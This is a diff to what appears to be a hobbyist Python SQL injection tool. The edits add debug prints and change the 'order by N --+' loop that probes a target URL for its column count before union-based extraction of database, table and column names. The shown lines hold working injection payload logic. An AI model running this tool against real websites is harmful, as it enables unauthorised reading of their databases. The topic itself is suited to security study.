@@ -28,18 +28,21 @@ class error_injection(base.injection):
         j, k = 0, 0
         last_req = ""
         sqli_url = self.base_url
+        print(sqli_url)
         #	print(len(last_req))
         #	temp_url=base_url.split("=",1)
         #	sqli_url=temp_url[0]+"=-"+temp_url[1]
-        for i in range(1, 10):
+        for i in range(3, 5):
             order_url = sqli_url + u"' order by %s --+" % (i)
             #		print(order_url)
             latest_req = requests.get(url=order_url).text
-            if (latest_req != last_req) & (len(last_req) != 0):
-                #			print(j)
+            if (len(latest_req) != len(last_req)) & (len(last_req) != 0):
+                print(order_url)
                 return j
                 break
             else:
+                print(order_url)
+                print(len(latest_req))
                 last_req = latest_req
                 j = i
 
@@ -170,6 +173,8 @@ def main():
                 # 获取第三个参数，注入出数据库名，表名，或者字段名，循环太多了，感觉自己好傻。
 
                 if len(sys.argv) > 3:
+                    print("injection")
+                    print(union_url)
                     if sys.argv[3] == "-D" and (len(sys.argv) == 4):
                         injection.injection_dbname(union_url)
                     elif sys.argv[3] == "-D" and sys.argv[5] == "-T" and len(sys.argv) < 7:
